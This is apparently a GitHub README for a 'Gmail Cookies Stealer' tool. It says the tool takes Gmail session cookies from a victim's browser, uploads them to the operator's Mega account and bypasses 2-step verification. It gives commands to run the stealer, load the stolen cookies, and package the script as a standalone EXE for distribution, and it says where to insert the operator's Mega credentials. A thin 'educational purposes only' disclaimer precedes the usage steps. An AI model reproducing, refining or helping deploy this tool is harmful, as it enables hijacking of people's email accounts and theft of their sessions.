# Gmail Cookies Stealer

Steal All Profile Gmail Cookies On Browser And Upload To Your Mega Account. Also Bypass 2-Step Verifications

## Disclamer ⚠️

This tool is for educational purposes only; Any actions and or activities related to this tool are solely your responsibility. The used of this tool can result in criminal charges brought against the persons in question. I'll not be held responsible in the event any criminal charges be brought against any individuals misusing this tool to break the law. ❗


## Module Used

```python
chromedriver_autoinstaller==0.4.0
mega.py==1.0.8
selenium==4.4.3
undetected_chromedriver==3.1.5.post4
```
## Usage

This tool will work if user doesn't logout their Gmail Account in their browser.

### Install All Module

```python
  pip install -r requirements.txt
```
### Run Tool

```python
  #Steal cookies
  python cookies_stealer.py
  
  #Load cookies
  python load_cookies.py
```

### Load Cookies
Download Cookies file from your mega account and put into the same directory with load_cookies.py. Change line 11 with the same name of cookies file.
<img src="https://github.com/katakkentut/GmailCookieStealer/blob/master/screenshot/example-2.png">

### Convert To EXE

```python
  # Using Pyinstaller
  Pyinstaller --noconfirm --onefile cookies_stealer.py

  # recommend Using Nuitka
  py -m nuitka --mingw64 .\cookies_stealer.py --standalone --onefile 
 ```
 
### Change Account

Change line 47 and 48 to your own mega account

<img src="https://github.com/katakkentut/GmailCookieStealer/blob/master/screenshot/example-1.png">


 
 
